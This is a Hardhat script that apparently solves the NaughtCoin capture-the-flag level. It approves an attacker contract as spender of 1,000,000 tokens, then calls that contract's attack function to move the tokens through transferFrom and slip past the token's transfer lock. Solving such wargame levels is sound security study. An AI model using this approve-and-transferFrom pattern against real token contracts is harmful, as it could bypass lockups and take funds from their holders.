const hre = require("hardhat");
const hackABI = require("../artifacts/contracts/NaughtCoinHack.sol/NaughtCoinHack.json").abi;
const targetABI = require("../artifacts/contracts/NaughtCoin.sol/NaughtCoin.json").abi;

async function main() {

    // Deployer is my Metamask
    const [deployer] = await hre.ethers.getSigners();
    console.log("attacking with MetaMask address:", deployer.address)

    // Instantiating hack contract
    const hackAddress = "0xF9B9Ee38A42a7c70e8e27ecffa5522DeFfd69bc7"
    const hackContract = new hre.ethers.Contract(hackAddress, hackABI, deployer);

    // Instantiate the target (NaughtCoin) contract
    const targetAddress = "0x6FDbd3cC65C54F45F229a3560e2D30b6904b8F9A";
    const targetContract = new hre.ethers.Contract(targetAddress, targetABI, deployer);

    // Amount
    const amount = ethers.parseEther("1000000")

    // Approve hackAddress as a spender for targetContract
    const approveTx = await targetContract.approve(hackAddress, amount);
    await approveTx.wait();
    console.log("Approved hackAddress as spender:", approveTx.hash);

    // Call transferFrom with `attack` function we made.
    const attackTx = await hackContract.attack(targetAddress);
    await attackTx.wait();
    console.log("Attacked from hack contract", attackTx.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });